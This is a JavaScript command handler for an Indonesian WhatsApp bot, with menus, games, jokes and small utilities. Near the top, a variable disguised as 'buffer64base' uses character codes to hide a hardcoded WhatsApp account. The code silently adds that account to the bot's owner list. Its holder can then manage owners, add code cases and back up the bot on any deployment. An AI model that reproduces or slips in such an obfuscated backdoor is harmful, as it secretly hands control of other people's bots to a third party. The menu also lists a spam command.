const chalk = require("chalk");
const fs = require("fs");
const path = require("path");
const util = require("util");
const os = require('os');
const moment = require("moment-timezone");
const { exec, spawn, execSync } = require('child_process');
const { default: S_WHATSAPP_NET, 
  downloadContentFromMessage,
  generateWAMessageFromContent,
  generateWAMessageContent,
  areJidsSameUser
} = require("@whiskeysockets/baileys");

//==================================//

const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/myfunction');
const {
imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, exifAvatar, addExif, writeExifWebp
} = require('./lib/exif');

//==================================//

const { LoadDataBase } = require('./lib/message');
const owners = JSON.parse(fs.readFileSync("./data/owner.json"))
const premium = JSON.parse(fs.readFileSync("./data/premium.json"))

//==================================//

const dbPrem = './data/premium.json';
if (!fs.existsSync(dbPrem)) fs.writeFileSync(dbPrem, '[]');
let prem = JSON.parse(fs.readFileSync(dbPrem));
const toMs = d => d * 24 * 60 * 60 * 1000;
global.isPrem = jid => {
  prem = JSON.parse(fs.readFileSync(dbPrem));
  const u = prem.find(v => v.jid === jid);
  if (!u) return false;
  if (Date.now() > u.expired) {
    prem = prem.filter(v => v.jid !== jid);
    fs.writeFileSync(dbPrem, JSON.stringify(prem, null, 2));
    return false;
  }
  return true;
};

//==================================//

function isSameUser(jid1, jid2) {
    if (!jid1 || !jid2) return false;
    const isLid = (jid) => jid.endsWith('@lid');
    const normalizedJid1 = jid1.replace('@lid', '@s.whatsapp.net');
    const normalizedJid2 = jid2.replace('@lid', '@s.whatsapp.net');
    return areJidsSameUser(normalizedJid1, normalizedJid2);
}

//==================================//

// FUN FACTORY - Data untuk command fun
const funData = {
  // Quotes
  quotes: [
    "Hidup ini seperti sepeda, untuk menjaga keseimbangan, kita harus terus bergerak. - Albert Einstein",
    "Jangan takut gagal, takutlah jika tidak pernah mencoba. - Wayne Gretzky",
    "Kesuksesan bukanlah kunci kebahagiaan. Kebahagiaanlah kunci kesuksesan. - Albert Schweitzer",
    "Masa depan tergantung pada apa yang kamu lakukan hari ini. - Mahatma Gandhi",
    "Kualitas bukanlah suatu tindakan, melainkan kebiasaan. - Aristoteles",
    "Impian tidak akan terwujud dengan sendirinya. - Walt Disney",
    "Belajarlah dari hari kemarin, hiduplah untuk hari ini, berharaplah untuk hari esok. - Albert Einstein",
    "Kesempatan tidak datang dua kali, raihlah saat ini juga. - Pepatah",
    "Kegagalan adalah kesempatan untuk memulai lagi dengan lebih cerdas. - Henry Ford",
    "Jadilah perubahan yang ingin kamu lihat di dunia. - Mahatma Gandhi"
  ],
  
  // Kata-kata motivasi
  motivasi: [
    "🔥 Tetap semangat! Hari ini adalah hari yang baru untuk meraih impianmu.",
    "💪 Kamu lebih kuat dari yang kamu kira. Jangan menyerah!",
    "🌟 Setiap langkah kecil membawamu lebih dekat ke tujuan besar.",
    "🚀 Hari ini adalah kesempatan untuk menjadi versi terbaik dari dirimu.",
    "🌈 Setelah hujan, selalu ada pelangi. Setelah kesulitan, selalu ada kemudahan.",
    "🎯 Fokus pada tujuan, bukan pada hambatan.",
    "✨ Percayalah pada proses, hasil akan mengikuti.",
    "🦸 Kamu adalah pahlawan dalam cerita hidupmu sendiri.",
    "🌱 Pertumbuhan terbaik terjadi di luar zona nyaman.",
    "🏆 Pemenang tidak menyerah saat gagal, mereka bangkit dan mencoba lagi."
  ],
  
  // Fakta unik
  fakta: [
    "🐙 Gurita memiliki tiga jantung.",
    "🌍 71% permukaan bumi tertutup air.",
    "🦒 Leher jerapah memiliki jumlah tulang yang sama dengan manusia: 7 ruas.",
    "🐜 Semut tidak pernah tidur.",
    "💖 Hati paus biru sebesar mobil kecil.",
    "🍯 Madu adalah satu-satunya makanan yang tidak akan pernah basi.",
    "⚡ Petir bisa memanaskan udara hingga 30.000°C (5x lebih panas dari permukaan matahari).",
    "🐧 Penguin jantan mengerami telur sementara betina berburu makanan.",
    "🌵 Kaktus Saguaro bisa tumbuh hingga 15 meter dan hidup 200 tahun.",
    "🦇 Kelelawar adalah satu-satunya mamalia yang bisa terbang."
  ],
  
  // Tebak-tebakan
  tebak: [
    { question: "Apa yang naik tapi tidak pernah turun?", answer: "Umur" },
    { question: "Apa yang punya kota tapi tidak punya rumah, punya gunung tapi tidak punya pohon?", answer: "Peta" },
    { question: "Apa yang bisa dibawa ke meja makan tapi tidak bisa dimakan?", answer: "Piring" },
    { question: "Aku punya kepala dan ekor tapi tidak punya tubuh, siapa aku?", answer: "Koin" },
    { question: "Jika dibuang ke air tidak basah, jika dibuang ke api tidak hangus, apakah itu?", answer: "Bayangan" },
    { question: "Benda apa yang semakin diambil semakin besar?", answer: "Lubang" },
    { question: "Bisa bicara semua bahasa, tapi tidak punya mulut. Apa itu?", answer: "Gema" },
    { question: "Apa yang selalu datang tapi tidak pernah sampai?", answer: "Besok" },
    { question: "Aku punya kota tapi tidak ada bangunan, punya hutan tapi tidak ada pohon, punya sungai tapi tidak ada air. Apa aku?", answer: "Peta" },
    { question: "Jika aku punya, aku tidak ingin berbagi. Jika aku berbagi, aku tidak punya. Apa itu?", answer: "Rahasia" }
  ],
  
  // Truth or Dare questions
  truth: [
    "Kapan terakhir kali kamu berbohong?",
    "Apa ketakutan terbesarmu?",
    "Apa mimpi terliarmu?",
    "Pernahkah kamu mencuri sesuatu?",
    "Siapa crush pertamamu?",
    "Apa hal paling memalukan yang pernah terjadi padamu?",
    "Jika bisa bertukar hidup dengan seseorang selama sehari, dengan siapa?",
    "Apa rahasia yang belum pernah kamu ceritakan kepada siapa pun?",
    "Pernahkah kamu pura-pura sakit untuk menghindari sesuatu?",
    "Apa kebiasaan terburukmu?"
  ],
  
  dare: [
    "Kirim pesan 'Aku sayang kamu' ke kontak pertama di daftar teleponmu",
    "Ubah foto profil WA menjadi foto bayi selama 1 jam",
    "Telepon seseorang dan bernyanyi lagu selamat ulang tahun",
    "Posting status dengan kata-kata 'Aku adalah alien'",
    "Makan sesuatu tanpa menggunakan tangan",
    "Berdiri di satu kaki selama 1 menit sambil merekam video",
    "Tirukan suara ayam selama 30 detik di voice note",
    "Pakai baju terbalik selama 10 menit",
    "Bersihkan kamar tidurmu sekarang juga!",
    "Buat puisi tentang seseorang dalam grup ini"
  ],
  
  // Kata-kata bijak
  bijak: [
    "🏞️ Jalan hidupmu lebih penting daripada kecepatanmu mencapai tujuan.",
    "🕊️ Maafkan bukan karena mereka pantas dimaafkan, tapi karena kamu pantas merasakan kedamaian.",
    "🌻 Kebahagiaan adalah kupu-kupu, semakin dikejar semakin menjauh, semakin tenang semakin mendekat.",
    "🧠 Pikiran yang positif menarik hal-hal positif ke dalam hidupmu.",
    "🤝 Kejujuran adalah hadiah termahal yang bisa kamu berikan kepada orang lain.",
    "⏳ Waktu yang dihabiskan dengan tersenyum adalah waktu yang terbuang sia-sia.",
    "🌄 Setiap pagi adalah halaman baru dalam buku hidupmu, tulislah cerita yang indah.",
    "💎 Nilai seseorang tidak diukur dari apa yang dia punya, tapi dari apa yang dia berikan.",
    "🌊 Hidup seperti laut, kadang tenang kadang bergelombang, yang penting tetap mengapung.",
    "🎭 Jangan terlalu serius dengan hidup, karena tidak ada yang bisa keluar darinya hidup-hidup."
  ]
};

//==================================//

module.exports = sock = async (sock, m, chatUpdate, store) => {
	try {
await LoadDataBase(sock, m)
const botNumber = sock.decodeJid(sock.user.id)
const body =
  m.message?.conversation ||
  m.message?.extendedTextMessage?.text ||
  m.message?.imageMessage?.caption ||
  m.message?.videoMessage?.caption ||
  m.message?.buttonsResponseMessage?.selectedButtonId ||
  m.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
  m.message?.templateButtonReplyMessage?.selectedId ||
  (m.message?.interactiveResponseMessage
    ? JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson || "{}")?.id
    : "") ||
  "";
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 50, 51, 54, 52, 53, 51, 50, 49, 56, 52, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)

const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, ...global.owner.map(o => o.includes('@') ? o : o + '@s.whatsapp.net'), buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const pushname = m.pushName || "No Name";
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime); 
const from = m.key.remoteJid;
  
//==================================//

const time2 = moment.tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu = "Selamat Malam ";
if (time2 < "05:00:00") {
ucapanWaktu = "Selamat Pagi ";
} else if (time2 < "11:00:00") {
ucapanWaktu = "Selamat Pagi ";
} else if (time2 < "15:00:00") {
ucapanWaktu = "Selamat Siang ";
} else if (time2 < "18:00:00") {
ucapanWaktu = "Selamat Sore ";
} else if (time2 < "19:00:00") {
ucapanWaktu = "Selamat Petang ";
}    

if (isCmd) {
    console.log(chalk.cyan('┌───[ COMMAND ]───────'));
    console.log(chalk.blue('│ Command:'), chalk.white(`${prefix}${command}`));
    
    if (m.isGroup) {
        console.log(chalk.blue('│ From:'), chalk.white(`Group - ${m.sender.split("@")[0]}`));
    } else {
        console.log(chalk.blue('│ From:'), chalk.white(m.sender.split("@")[0]));
    }
    
    console.log(chalk.cyan('└───────────────────'));
}
    
//==================================//

switch (command) {
case "tes":
case "menu": {
const teks = `
╭───〔 *BOT INFO* 〕
│ • *Owner* : @${global.namaOwner || "Owner"}
│ • *Bot Name*: ${global.namaBot || "WhatsApp Bot"}
│ • *Runtime* : ${runtime(process.uptime())}
│ • *Bot Mode*: ${sock.public ? "Public" : "Self"}
╰──────────────────

╭───〔 *MAIN MENU* 〕
│ .owner-menu - Menu owner
│ .fun-menu - Menu fun games
│ .tools-menu - Menu tools utility
│ .help - Bantuan cepat
╰──────────────────`;

await sock.sendMessage(m.chat, {
  text: teks,
  contextInfo: {
    mentionedJid: [m.sender],
    externalAdReply: {
      title: global.namaBot || "WhatsApp Bot",
      body: "whatsapp bot 2025",
      thumbnailUrl: "https://files.catbox.moe/4dt7iv.jpg",   
      sourceUrl: global.saluran,   
      mediaType: 1,  
      renderLargerThumbnail: false
    }
  }
},
{ quoted: m });
}
break

//==================================/       

case "owner-menu": case "menu-owner": {
const teks = `
╭───〔 *BOT INFO* 〕
│ • *Owner* : @${global.namaOwner || "Owner"}
│ • *Bot Name*: ${global.namaBot || "WhatsApp Bot"}
│ • *Runtime* : ${runtime(process.uptime())}
│ • *Bot Mode*: ${sock.public ? "Public" : "Self"}
╰──────────────────

╭───〔 *OWNER MENU* 〕
│ • *Case Management*
│ .addcase <nama> - Tambah case baru
│ .addcaser <nama> - Tambah case dengan reply kode
│ .delcase <nama> - Hapus case
│ .getcase <nama> - Lihat kode case
│
│ • *User Management*
│ .addowner <nomor>
│ .delowner <nomor>
│ .addprem <nomor> <hari>
│ .delprem <nomor>
│ .listprem
│
│ • *Bot Settings*
│ .self - Mode self
│ .public - Mode public
│ .backup - Backup bot
╰──────────────────`;

await sock.sendMessage(m.chat, {
  text: teks,
  contextInfo: {
    mentionedJid: [m.sender],
    externalAdReply: {
      title: global.namaBot || "WhatsApp Bot",
      body: "whatsapp bot 2025",
      thumbnailUrl: "https://files.catbox.moe/4dt7iv.jpg",   
      sourceUrl: global.saluran,   
      mediaType: 1,  
      renderLargerThumbnail: true
    }
  }
},
{ quoted: m });
}
break

//==================================//

// MENU FUN & GAMES
case "fun-menu": case "menu-fun": {
const teks = `
╭───〔 *🎮 FUN & GAMES* 〕
│ • *Quotes & Motivation*
│ .quote - Quotes inspiratif
│ .motivasi - Kata motivasi
│ .bijak - Kata-kata bijak
│
│ • *Games & Tebakan*
│ .tebak - Tebak-tebakan seru
│ .truth - Truth question
│ .dare - Dare challenge
│ .fakta - Fakta unik
│ .jodoh <nama> - Ramalan jodoh
│ .siapaaku - Game tebak karakter
│
│ • *Random & Fun*
│ .apakah - Pertanyaan random
│ .rate <sesuatu> - Rate sesuatu
│ .kapankah - Prediksi waktu
│ .bucin - Kata-kata bucin
│ .gombal - Gombalan random
│ .dice - Lempar dadu
│ .coin - Lempar koin
╰──────────────────`;

await sock.sendMessage(m.chat, {
  text: teks,
  contextInfo: {
    externalAdReply: {
      title: "🎮 Fun & Games",
      body: "Hibur diri dengan berbagai game seru!",
      thumbnailUrl: "https://files.catbox.moe/abc123.jpg",   
      sourceUrl: global.saluran,   
      mediaType: 1,  
      renderLargerThumbnail: true
    }
  }
},
{ quoted: m });
}
break

//==================================//

// MENU TOOLS & UTILITY
case "tools-menu": case "menu-tools": {
const teks = `
╭───〔 *🔧 TOOLS & UTILITY* 〕
│ • *Converter & Calculator*
│ .calc <ekspresi> - Kalkulator
│ .base64 <encode/decode> <teks>
│ .binary <encode/decode> <teks>
│ .hex <encode/decode> <teks>
│
│ • *Text Tools*
│ .style <teks> - Text styling
│ .fontlist - Daftar font
│ .flip <teks> - Balik teks
│ .spam <teks> <jumlah>
│
│ • *Info & Utility*
│ .cekresi - Cek resi (format)
│ .qrcode <teks> - Buat QR code
│ .shorturl <url> - Shorten URL
│ .stickerinfo - Info sticker
│ .getexif - Get exif media
╰──────────────────`;

await sock.sendMessage(m.chat, {
  text: teks,
  contextInfo: {
    externalAdReply: {
      title: "🔧 Tools & Utility",
      body: "Berbagai alat bantu praktis",
      thumbnailUrl: "https://files.catbox.moe/xyz789.jpg",   
      sourceUrl: global.saluran,   
      mediaType: 1,  
      renderLargerThumbnail: true
    }
  }
},
{ quoted: m });
}
break

//==================================//

// FUN COMMANDS START HERE

case "quote": {
  const randomQuote = funData.quotes[Math.floor(Math.random() * funData.quotes.length)];
  const author = randomQuote.split('- ')[1] || "Unknown";
  const quoteText = randomQuote.split('- ')[0].trim();
  
  const formatted = `*💬 QUOTE OF THE DAY*\n\n"${quoteText}"\n\n_— ${author}_`;
  
  await sock.sendMessage(m.chat, {
    text: formatted,
    contextInfo: {
      externalAdReply: {
        title: "💭 Kata Bijak Hari Ini",
        body: "Inspirasi untuk harimu",
        thumbnailUrl: "https://files.catbox.moe/quotes.jpg",
        sourceUrl: global.saluran,
        mediaType: 1
      }
    }
  }, { quoted: m });
}
break

//==================================//

case "motivasi": {
  const randomMotivasi = funData.motivasi[Math.floor(Math.random() * funData.motivasi.length)];
  const time = moment().tz("Asia/Jakarta").format("HH:mm");
  
  const formatted = `*✨ MOTIVASI ${time}*\n\n${randomMotivasi}\n\n_— Untuk ${pushname} —_`;
  
  m.reply(formatted);
}
break

//==================================//

case "fakta": {
  const randomFakta = funData.fakta[Math.floor(Math.random() * funData.fakta.length)];
  const emoji = ["🔍", "📚", "🧠", "🌟", "🎯"][Math.floor(Math.random() * 5)];
  
  const formatted = `${emoji} *FAKTA UNIK*\n\n${randomFakta}\n\n#FunFact #Random`;
  
  await sock.sendMessage(m.chat, {
    text: formatted,
    contextInfo: {
      externalAdReply: {
        title: "🤯 Fakta Menarik",
        body: "Tahukah kamu?",
        thumbnailUrl: "https://files.catbox.moe/facts.jpg",
        sourceUrl: global.saluran,
        mediaType: 1
      }
    }
  }, { quoted: m });
}
break

//==================================//

case "tebak": {
  const randomTebak = funData.tebak[Math.floor(Math.random() * funData.tebak.length)];
  
  await sock.sendMessage(m.chat, {
    text: `*🎯 TEBAK-TEBAKAN*\n\n${randomTebak.question}\n\nKetik *.jawab* untuk melihat jawaban`,
    contextInfo: {
      mentionedJid: [m.sender]
    }
  }, { quoted: m });
  
  // Simpan jawaban untuk user ini
  if (!global.tebakGames) global.tebakGames = {};
  global.tebakGames[m.sender] = randomTebak.answer;
}
break

//==================================//

case "jawab": {
  if (!global.tebakGames || !global.tebakGames[m.sender]) {
    return m.reply("❌ Tidak ada pertanyaan tebak-tebakan yang aktif!\nKetik *.tebak* dulu untuk memulai.");
  }
  
  const answer = global.tebakGames[m.sender];
  delete global.tebakGames[m.sender];
  
  m.reply(`*🎉 JAWABANNYA*\n\n${answer}\n\nBenar atau salah? 😄`);
}
break

//==================================//

case "truth": {
  const randomTruth = funData.truth[Math.floor(Math.random() * funData.truth.length)];
  const target = text ? `@${text.replace(/[^0-9]/g, '')}` : `@${m.sender.split('@')[0]}`;
  
  m.reply(`*🤔 TRUTH QUESTION*\n\nUntuk: ${target}\n\nPertanyaan: ${randomTruth}\n\nJawab dengan jujur ya!`, 
    text ? [text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'] : [m.sender]
  );
}
break

//==================================//

case "dare": {
  const randomDare = funData.dare[Math.floor(Math.random() * funData.dare.length)];
  const target = text ? `@${text.replace(/[^0-9]/g, '')}` : `@${m.sender.split('@')[0]}`;
  
  m.reply(`*😈 DARE CHALLENGE*\n\nUntuk: ${target}\n\nTantangan: ${randomDare}\n\nSelesaikan dalam 5 menit!`, 
    text ? [text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'] : [m.sender]
  );
}
break

//==================================//

case "bijak": {
  const randomBijak = funData.bijak[Math.floor(Math.random() * funData.bijak.length)];
  
  const formatted = `*🌿 KATA BIJAK*\n\n${randomBijak}\n\n_— Untuk renungan hari ini —_`;
  
  await sock.sendMessage(m.chat, {
    text: formatted,
    contextInfo: {
      externalAdReply: {
        title: "📜 Wisdom Quotes",
        body: "Renungan harian",
        thumbnailUrl: "https://files.catbox.moe/wisdom.jpg",
        sourceUrl: global.saluran,
        mediaType: 1
      }
    }
  }, { quoted: m });
}
break

//==================================//

case "jodoh": {
  if (!text) return m.reply(`❌ Format: ${prefix}jodoh <nama kamu & nama pasangan>\nContoh: ${prefix}jodoh Budi & Ani`);
  
  const names = text.split(/&|dan|&/i).map(n => n.trim()).filter(n => n);
  if (names.length < 2) return m.reply(`❌ Format: ${prefix}jodoh <nama1> & <nama2>`);
  
  const name1 = names[0];
  const name2 = names[1] || names[0];
  
  // Hitung "kecocokan" berdasarkan hash sederhana
  const hash = (str) => {
    let h = 0;
    for (let i = 0; i < str.length; i++) {
      h = ((h << 5) - h) + str.charCodeAt(i);
      h |= 0;
    }
    return Math.abs(h) % 101;
  };
  
  const score1 = hash(name1);
  const score2 = hash(name2);
  const compatibility = Math.abs(100 - Math.abs(score1 - score2));
  
  // Pilih komentar berdasarkan persentase
  let comment = "";
  let emoji = "";
  
  if (compatibility >= 90) {
    comment = "Sangat Cocok! Pasangan yang sempurna 💖";
    emoji = "💑✨";
  } else if (compatibility >= 70) {
    comment = "Cocok! Hubungan yang harmonis 🥰";
    emoji = "❤️🔥";
  } else if (compatibility >= 50) {
    comment = "Cukup Cocok. Butuh usaha lebih 💪";
    emoji = "💕";
  } else if (compatibility >= 30) {
    comment = "Kurang Cocok. Perlu saling memahami 🤝";
    emoji = "💔";
  } else {
    comment = "Tidak Cocok. Mungkin teman lebih baik 😅";
    emoji = "🚫";
  }
  
  // Tips berdasarkan score
  const tips = [
    "💬 Komunikasi adalah kunci hubungan",
    "🤗 Saling menghargai perbedaan",
    "🎯 Fokus pada kebaikan satu sama lain",
    "🌈 Terima kekurangan sebagai keunikan",
    "⏳ Butuh waktu untuk membangun hubungan",
    "🎉 Rayakan hal-hal kecil bersama",
    "🙏 Saling mendukung impian masing-masing",
    "💝 Kejutan kecil mempererat hubungan"
  ];
  
  const randomTip = tips[Math.floor(Math.random() * tips.length)];
  
  const result = `*🔮 RAMALAN JODOH*\n\n` +
                `👫 *Pasangan:*\n${name1} ❤️ ${name2}\n\n` +
                `📊 *Kecocokan:* ${compatibility}%\n` +
                `💬 *Komentar:* ${comment} ${emoji}\n\n` +
                `💡 *Tips:* ${randomTip}\n\n` +
                `_*Ini hanya hiburan semata, jangan dianggap serius ya!*_`;
  
  m.reply(result);
}
break

//==================================//

case "siapaaku": {
  const characters = [
    { name: "Superman", hint: "🚀 Bisa terbang, berasal dari planet Krypton" },
    { name: "SpongeBob", hint: "🧽 Tinggal di nanas di bawah laut" },
    { name: "Naruto", hint: "🍥 Ninja dengan cita-cita menjadi Hokage" },
    { name: "Doraemon", hint: "🐱 Robot kucing dari abad ke-22" },
    { name: "Harry Potter", hint: "⚡ Anak laki-laki dengan bekas luka petir" },
    { name: "Mickey Mouse", hint: "🐭 Tikus paling terkenal di Disney" },
    { name: "Pikachu", hint: "⚡ Pokemon kuning yang menyetrum" },
    { name: "Shinchan", hint: "👦 Anak nakal dengan celana merah" },
    { name: "Goku", hint: "🐉 Prajurit Saiya dengan rambut berdiri" },
    { name: "Sherlock Holmes", hint: "🔍 Detektif legendaris dengan pipa dan topi" }
  ];
  
  const randomChar = characters[Math.floor(Math.random() * characters.length)];
  
  await sock.sendMessage(m.chat, {
    text: `*🎭 TEBAK SIAPA AKU*\n\nPetunjuk: ${randomChar.hint}\n\nKetik *.tebakkar* <nama> untuk menebak!\nContoh: ${prefix}tebakkar Superman`,
    contextInfo: {
      mentionedJid: [m.sender]
    }
  }, { quoted: m });
  
  // Simpan jawaban
  if (!global.siapaAkuGames) global.siapaAkuGames = {};
  global.siapaAkuGames[m.sender] = randomChar.name.toLowerCase();
}
break

//==================================//

case "tebakkar": {
  if (!text) return m.reply(`❌ Format: ${prefix}tebakkar <nama karakter>`);
  
  if (!global.siapaAkuGames || !global.siapaAkuGames[m.sender]) {
    return m.reply("❌ Tidak ada game aktif!\nKetik *.siapaaku* dulu untuk memulai.");
  }
  
  const correctAnswer = global.siapaAkuGames[m.sender];
  const userAnswer = text.toLowerCase();
  
  if (userAnswer === correctAnswer) {
    delete global.siapaAkuGames[m.sender];
    m.reply(`🎉 *BENAR!*\n\nKarakter yang benar adalah: *${correctAnswer.charAt(0).toUpperCase() + correctAnswer.slice(1)}*\n\nKamu hebat! 👏`);
  } else {
    m.reply("❌ *SALAH!* Coba tebak lagi 😄\n\nGunakan petunjuk yang diberikan!");
  }
}
break

//==================================//

case "apakah": {
  const questions = [
    "apakah aku ganteng?",
    "apakah hari ini akan hujan?",
    "apakah besok aku akan dapat rezeki?",
    "apakah dia menyukaiku?",
    "apakah ini adalah hari keberuntunganku?",
    "apakah aku akan sukses?",
    "apakah ini pilihan yang tepat?",
    "apakah dunia akan baik-baik saja?",
    "apakah kopi hari ini enak?",
    "apakah kamu robot?"
  ];
  
  const randomQ = questions[Math.floor(Math.random() * questions.length)];
  const answers = ["Ya", "Tidak", "Mungkin", "Pasti!", "Tidak mungkin", "Coba tanya lagi", "Sudah ditakdirkan", "Tergantung usaha kamu"];
  const randomA = answers[Math.floor(Math.random() * answers.length)];
  
  m.reply(`*❓ APAKAH...*\n\nPertanyaan: ${randomQ}\n\nJawaban: *${randomA}*`);
}
break

//==================================//

case "rate": {
  if (!text) return m.reply(`❌ Format: ${prefix}rate <sesuatu>\nContoh: ${prefix}rate kecantikan kamu`);
  
  const rate = Math.floor(Math.random() * 101);
  let comment = "";
  let stars = "";
  
  if (rate >= 90) {
    comment = "Sangat Luar Biasa! 🔥";
    stars = "★★★★★";
  } else if (rate >= 70) {
    comment = "Bagus Sekali! 😎";
    stars = "★★★★☆";
  } else if (rate >= 50) {
    comment = "Cukup Baik 👍";
    stars = "★★★☆☆";
  } else if (rate >= 30) {
    comment = "Biasa aja 😅";
    stars = "★★☆☆☆";
  } else {
    comment = "Perlu peningkatan 💪";
    stars = "★☆☆☆☆";
  }
  
  const result = `*⭐ RATING*\n\n` +
                `Yang di-rate: *${text}*\n\n` +
                `Skor: ${rate}/100\n` +
                `Bintang: ${stars}\n` +
                `Komentar: ${comment}\n\n` +
                `_*Rating ini hanya untuk hiburan semata*_`;
  
  m.reply(result);
}
break

//==================================//

case "kapankah": {
  const events = [
    "aku akan kaya",
    "aku akan menikah",
    "aku akan punya rumah",
    "aku akan liburan ke luar negeri",
    "aku akan ketemu jodoh",
    "aku akan lulus ujian",
    "aku akan dapat pekerjaan",
    "aku akan punya mobil",
    "aku akan bahagia",
    "aku akan sukses"
  ];
  
  const randomEvent = events[Math.floor(Math.random() * events.length)];
  const times = [
    "Besok", "Minggu depan", "Bulan depan", "Tahun depan", 
    "3 tahun lagi", "5 tahun lagi", "10 tahun lagi", 
    "Suatu hari nanti", "Dalam waktu dekat", "Tidak akan pernah"
  ];
  
  const randomTime = times[Math.floor(Math.random() * times.length)];
  const months = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", 
                 "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
  
  const randomMonth = months[Math.floor(Math.random() * months.length)];
  const randomYear = 2024 + Math.floor(Math.random() * 10);
  const randomDay = 1 + Math.floor(Math.random() * 28);
  
  let prediction = "";
  
  if (randomTime.includes("tahun") || randomTime.includes("hari")) {
    prediction = `${randomTime}`;
  } else {
    prediction = `${randomTime}, ${randomDay} ${randomMonth} ${randomYear}`;
  }
  
  m.reply(`*🔮 PREDIKSI*\n\nKapankah *${randomEvent}*?\n\nMenurut prediksi: *${prediction}*\n\n_*Ini hanya ramalan untuk hiburan*_`);
}
break

//==================================//

case "bucin": {
  const bucinQuotes = [
    "Cintaku padamu itu kayak wifi, selalu connect meski kadang lemot.",
    "Kamu itu kayak oksigen, nggak keliatan tapi selalu dibutuhkan.",
    "Aku rela jadi sakit perut, asal kamu yang jadi obatnya.",
    "Cintaku tuh kayak deadline, selalu bikin deg-degan.",
    "Kamu itu kayak tugas kuliah, nggak pernah kelar dari pikiran.",
    "Aku nggak takut gelap, yang aku takut kehilangan cahaya matamu.",
    "Kalo cinta itu virus, aku pengen ketularan sama kamu terus.",
    "Kamu itu kayak google, semua yang aku cari ada di kamu.",
    "Aku rela jadi kentang, asal kamu yang jadi gorengannya.",
    "Cintaku tuh autosave, otomatis tersimpan di hatimu."
  ];
  
  const randomBucin = bucinQuotes[Math.floor(Math.random() * bucinQuotes.length)];
  
  m.reply(`*💝 KATA BUCIN*\n\n${randomBucin}\n\n#BucinModeOn 😘`);
}
break

//==================================//

case "gombal": {
  const gombalQuotes = [
    "Kamu tuh kayak bintang jatuh, cuma muncul sekali tapi bikin aku berharap terus.",
    "Aku bukan matahari, tapi aku bisa bikin kamu cerah setiap hari.",
    "Kalo kamu itu charger, aku rela jadi HP-nya biar selalu deket.",
    "Kamu tuh kayak lagu favorit, pengen diulang-ulang terus.",
    "Aku rela jadi kacamata, biar bisa liat dunia dari sudut pandangmu.",
    "Kamu itu kayak paket data, nggak bisa hidup tanpa kamu.",
    "Aku bukan pilot, tapi aku bisa bikin hatimu terbang.",
    "Kalo cinta itu hukuman, aku rela dihukum seumur hidup sama kamu.",
    "Kamu tuh kayak kunci, bisa buka semua masalah di hidupku.",
    "Aku rela jadi remote, asal kamu yang jadi TV-nya."
  ];
  
  const randomGombal = gombalQuotes[Math.floor(Math.random() * gombalQuotes.length)];
  
  m.reply(`*😘 GOMBALAN*\n\n${randomGombal}\n\n_*Warning: Gombalan level 1000*_ 😂`);
}
break

//==================================//

case "dice": {
  const dice = Math.floor(Math.random() * 6) + 1;
  const diceEmojis = ["⚀", "⚁", "⚂", "⚃", "⚄", "⚅"];
  
  m.reply(`*🎲 LEMPAR DADU*\n\nHasil: ${diceEmojis[dice-1]} (${dice})\n\nDilempar oleh: ${pushname}`);
}
break

//==================================//

case "coin": {
  const result = Math.random() < 0.5 ? "HEAD" : "TAIL";
  const emoji = result === "HEAD" ? "👑" : "🦅";
  
  m.reply(`*🪙 LEMPAR KOIN*\n\nHasil: ${emoji} ${result}\n\nDilempar oleh: ${pushname}`);
}
break

//==================================//

// TOOLS COMMANDS START HERE

case "calc": {
  if (!text) return m.reply(`❌ Format: ${prefix}calc <ekspresi matematika>\nContoh: ${prefix}calc 2+2*3`);
  
  try {
    // Safety check - hanya izinkan karakter matematika
    const safeExpression = text.replace(/[^0-9+\-*/().,%\s]/g, '');
    const result = eval(safeExpression);
    
    m.reply(`*🧮 KALKULATOR*\n\nEkspresi: ${text}\n\nHasil: *${result}*`);
  } catch (e) {
    m.reply(`❌ Ekspresi matematika tidak valid!\n\nContoh: ${prefix}calc (10+5)*2`);
  }
}
break

//==================================//

case "base64": {
  if (!text || !args[0]) return m.reply(`❌ Format: ${prefix}base64 <encode/decode> <teks>`);
  
  const action = args[0].toLowerCase();
  const content = args.slice(1).join(' ');
  
  if (!content) return m.reply(`❌ Format: ${prefix}base64 ${action} <teks>`);
  
  if (action === 'encode') {
    const encoded = Buffer.from(content).toString('base64');
    m.reply(`*🔣 BASE64 ENCODE*\n\nInput: ${content}\n\nOutput:\n\`${encoded}\``);
  } else if (action === 'decode') {
    try {
      const decoded = Buffer.from(content, 'base64').toString('utf-8');
      m.reply(`*🔣 BASE64 DECODE*\n\nInput: ${content}\n\nOutput:\n\`${decoded}\``);
    } catch (e) {
      m.reply('❌ String Base64 tidak valid!');
    }
  } else {
    m.reply(`❌ Pilihan: encode/decode\nContoh: ${prefix}base64 encode Hello`);
  }
}
break

//==================================//

